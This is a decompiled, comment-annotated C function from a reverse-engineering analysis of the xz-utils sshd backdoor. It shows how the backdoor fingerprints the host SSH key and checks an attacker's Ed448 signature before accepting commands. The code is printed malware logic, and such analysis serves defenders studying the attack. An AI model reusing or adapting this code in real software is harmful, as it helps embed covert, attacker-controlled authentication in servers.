// /home/kali/xzre-ghidra/xzregh/107630_verify_signature.c
// Function: verify_signature @ 0x107630
// Calling convention: __stdcall
// Prototype: BOOL __stdcall verify_signature(sshkey * sshkey, u8 * signed_data, u64 sshkey_digest_offset, u64 signed_data_size, u8 * signature, u8 * ed448_raw_key, global_context_t * global_ctx)


/*
 * AutoDoc: Builds the sshkey fingerprint that must sit at `sshkey_digest_offset` inside `signed_data`, patches the digest in place, and then
 * verifies the attacker-supplied Ed448 signature. RSA/DSA keys reuse `rsa_key_hash`/`dsa_key_hash`, ECDSA serialises the live
 * `EC_POINT` in uncompressed form with a 32-bit big-endian length prefix, and Ed25519 prepends the `0x20000000` tag plus the raw
 * 32-byte key. Once the fingerprint lands in the blob the helper instantiates an Ed448 `EVP_PKEY` from the baked public key and
 * runs `EVP_DigestVerify` over the `[0, tbs_len)` bytes; only a clean verify lets callers keep processing the monitor command.
 */

#include "xzre_types.h"

BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u64 signed_data_size,
                     u8 *signature,u8 *ed448_raw_key,global_context_t *global_ctx)

{
  size_t tbs_len;
  imported_funcs_t *imports;
  EC_KEY *ecdsa_key;
  u8 *ed25519_pub;
  BOOL success;
  uint ec_point_len;
  int status;
  EC_POINT *ecdsa_pubkey;
  EC_GROUP *ecdsa_group;
  size_t ec_point_bytes_written;
  EVP_PKEY *ed448_pkey;
  EVP_MD_CTX *mdctx;
  long loop_idx;
  size_t serialized_key_len;
  u8 *wipe_cursor;
  u8 serialized_key[0x89];
  u64 serialized_key_pad;
  u8 digest_scratch[128];
  
  if (sshkey == (sshkey *)0x0) {
    return FALSE;
  }
  if (signed_data == (u8 *)0x0) {
    return FALSE;
  }
  if (signed_data_size == 0) {
    return FALSE;
  }
  if (0xffffffffffffffde < sshkey_digest_offset) {
    return FALSE;
  }
  tbs_len = sshkey_digest_offset + 0x20;
  if (global_ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  if (signed_data_size < tbs_len) {
    return FALSE;
  }
  imports = global_ctx->imported_funcs;
  if (imports == (imported_funcs_t *)0x0) {
    return FALSE;
  }
  status = sshkey->type;
  if (status == 2) {
    ecdsa_key = sshkey->ecdsa;
    *(u64 *)serialized_key = 0;
    serialized_key_pad = 0;
    wipe_cursor = digest_scratch;
    // AutoDoc: Zero the digest scratch buffer so no stale bytes survive from the previous ECDSA fingerprint.
    for (loop_idx = 0x79; loop_idx != 0; loop_idx = loop_idx + -1) {
      *wipe_cursor = 0;
      wipe_cursor = wipe_cursor + 1;
    }
    if (ecdsa_key == (EC_KEY *)0x0) {
      return FALSE;
    }
    if (imports->EC_KEY_get0_public_key == (pfn_EC_KEY_get0_public_key_t)0x0) {
      return FALSE;
    }
    if (imports->EC_KEY_get0_group == (pfn_EC_KEY_get0_group_t)0x0) {
      return FALSE;
    }
    if (imports->EC_POINT_point2oct == (pfn_EC_POINT_point2oct_t)0x0) {
      return FALSE;
    }
    ecdsa_pubkey = (*imports->EC_KEY_get0_public_key)(ecdsa_key);
    ecdsa_group = (*imports->EC_KEY_get0_group)(ecdsa_key);
    // AutoDoc: Probe the uncompressed EC point length first so we can size-check and reserve 4 bytes for the big-endian length prefix.
    serialized_key_len = (*imports->EC_POINT_point2oct)(ecdsa_group,ecdsa_pubkey,4,(uchar *)0x0,0,(BN_CTX *)0x0);
    if (0x85 < serialized_key_len) {
      return FALSE;
    }
    ec_point_len = (uint)serialized_key_len;
    *(uint *)serialized_key =
                        ec_point_len >> 0x18 | (ec_point_len & 0xff0000) >> 8 | (ec_point_len & 0xff00) << 8 |
                        ec_point_len << 0x18;
    ec_point_bytes_written = (*imports->EC_POINT_point2oct)
                      (ecdsa_group,ecdsa_pubkey,4,(uchar *)((long)serialized_key + 4),serialized_key_len,(BN_CTX *)0x0);
    if (serialized_key_len != ec_point_bytes_written) {
      return FALSE;
    }
    serialized_key_len = serialized_key_len + 4;
  }
  else {
    if (status < 3) {
      if (status == 0) {
        success = rsa_key_hash(sshkey->rsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,imports);
      }
      else {
        if (status != 1) {
          return FALSE;
        }
        success = dsa_key_hash(sshkey->dsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,global_ctx);
      }
      goto LAB_001076f8;
    }
    if (status != 3) {
      return FALSE;
    }
    ed25519_pub = sshkey->ed25519_pk;
    serialized_key_pad = 0;
    wipe_cursor = digest_scratch;
    // AutoDoc: Reset the Ed25519 tag padding before copying the 32-byte public key into the serialized buffer.
    for (loop_idx = 5; loop_idx != 0; loop_idx = loop_idx + -1) {
      *wipe_cursor = 0;
      wipe_cursor = wipe_cursor + 1;
    }
    if (ed25519_pub == (u8 *)0x0) {
      return FALSE;
    }
    // AutoDoc: Ed25519 fingerprints are tagged: write the hard-coded `0x20000000` word before copying the 32-byte public key.
    *(u32 *)serialized_key = 0x20000000;
    loop_idx = 0;
    do {
      *(u8 *)((long)serialized_key + loop_idx + 4) = ed25519_pub[loop_idx];
      loop_idx = loop_idx + 1;
    } while (loop_idx != 0x20);
    serialized_key_len = 0x24;
  }
  // AutoDoc: Insert the freshly serialised fingerprint into the payload and hash it in place so the caller can verify the signed blob.
  success = sha256(serialized_key,serialized_key_len,signed_data + sshkey_digest_offset,
                 signed_data_size - sshkey_digest_offset,imports);
LAB_001076f8:
  if ((((success != FALSE) && (imports = global_ctx->imported_funcs, imports != (imported_funcs_t *)0x0)
       ) && (success = contains_null_pointers(&imports->EVP_PKEY_new_raw_public_key,6), success == FALSE)
      ) && ((ed448_raw_key != (u8 *)0x0 &&
            // AutoDoc: Load the embedded Ed448 public key (NID 0x440) directly from the attacker-provided raw bytes.
            (ed448_pkey = (*imports->EVP_PKEY_new_raw_public_key)(0x440,(ENGINE *)0x0,ed448_raw_key,0x39),
            ed448_pkey != (EVP_PKEY *)0x0)))) {
    mdctx = (*imports->EVP_MD_CTX_new)();
    if (mdctx != (EVP_MD_CTX *)0x0) {
      status = (*imports->EVP_DigestVerifyInit)
                        (mdctx,(EVP_PKEY_CTX **)0x0,(EVP_MD *)0x0,(ENGINE *)0x0,ed448_pkey);
      if ((status == 1) &&
         // AutoDoc: Run the Ed448 verify across `[signed_data, signed_data + tbs_len)`; the caller only proceeds on a `EVP_DigestVerify` success.
         (status = (*imports->EVP_DigestVerify)(mdctx,signature,0x72,signed_data,tbs_len), status == 1)) {
        (*imports->EVP_MD_CTX_free)(mdctx);
        (*imports->EVP_PKEY_free)(ed448_pkey);
        return TRUE;
      }
      (*imports->EVP_MD_CTX_free)(mdctx);
    }
    (*imports->EVP_PKEY_free)(ed448_pkey);
  }
  return FALSE;
}

